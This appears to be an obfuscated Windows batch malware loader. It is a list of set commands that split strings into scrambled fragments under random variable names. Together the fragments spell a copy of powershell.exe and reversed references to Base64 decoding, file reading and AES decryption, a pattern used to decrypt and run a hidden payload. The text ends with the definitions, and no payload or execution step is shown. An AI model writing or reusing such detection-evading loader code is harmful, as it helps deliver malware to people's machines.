@echo off
set "GSjivMaKCk=.e"
set "uQzCEWLgug=he"
set "RRjjbPyJab=32"
set "dpoaJgoLFw=\W"
set "RquboqBvCQ=rs"
set "anPDwLLnGX=rS"
set "vcBbJKiKzN=Wi"
set "DsSDQJrsVz=1."
set "CXPKbCKymH=ow"
set "epClmZXIcf=co"
set "YpkXSxnQZg=st"
set "IdhmGkcbSC=nd"
set "MxbZwqyuVV=ll"
set "cvMQAgXTrV=po"
set "FPchvgfaWc=do"
set "AMSlgupvFX= /"
set "AGzKCjIqBQ=ll"
set "dkIsChNVUS=we"
set "GUmBtJxZTs= C"
set "vyJxUDslRI=s\"
set "pClKIQoHOA=in"
set "BgNycuOebn=0\"
set "woTFkITAyb=\v"
set "aKxSrjuJsc=em"
set "RgzHjbFqPn=y "
set "ECqBbnLwtu=xe"
set "UPzlZiGbcJ=he"
set "dHGQxaqcAu=:\"
set "ZEQXdKvxil=ws"
set "kroKILAjRp=py"
set "BMzfKazukm=Sy"
set "AQVAwnnhEC=we"
set "VJeVNpGzBl=Po"
set "uVnPHYRgOI=cd"
set "iInCtdvbYb= %~dp0"
set "JNJeiNyrlm=brea"
set "mYJTLoqwVd=icB."
set "pBumhYCQUw=U = "
set "exdcPUhxiw=Syst"
set "SjjidhvYro=Secu"
set "XunfuxMgXN=gMod"
set "aPvbqevINk=ecry"
set "KuQlVaYroe=();$"
set "SbYwoXkBlI=;$hS"
set "kXfIeNMiSz=m(, "
set "PsNWFvxlVK=rlY "
set "dZXehOrRVk=yuvu"
set "SgfAPehtWL= '')"
set "edwMLmBOrG=ypto"
set "buHxIHaLWN=I, 0"
set "BThObvKymC=g = "
set "cCimeoHiXu=Fina"
set "lqdMPllzii=Obje"
set "obUUzGwvTS=ect "
set "LGpwwOUrol=)($E"
set "yNlhcsoBae=pose"
set "zmdTweZovQ=[-1."
set "LjVZhKCDEf='gni"
set "KZgcIvmqYi=rlY."
set "qautvKIAUT=gnir"
set "fVUeIAZUBF=saBm"
set "zrBhKuvGoL=[Sys"
set "adJKXELrMt=daeR"
set "WVsuaQMomd=);$s"
set "ToAxXLcqCX=BC;$"
set "YSmMCRPFbl=stem"
set "EftEvCEJOz=File"
set "VduVfrbRSy=$ryu"
set "ogXZMNtjHD=.IO."
set "XAnzAjpOCt=esFX"
set "McYLXMHbRi=n ''"
set "gzYXWQKPFR=16] "
set "fexdVbJMEq=am;$"
set "QpmOvJUKHh=ach "
set "kHDsUsRhzK=em.C"
set "qbtleXwWEh=..-1"
set "SjzPOyYBfT=F'[-"
set "imJLiLXvEj=Bmor"
set "AIHqQBiXTY=esaB"
set "EQzKTmDzOY=rGic"
set "POiiTqDDBC=y.Pa"
set "vADTFMLVPh=I = "
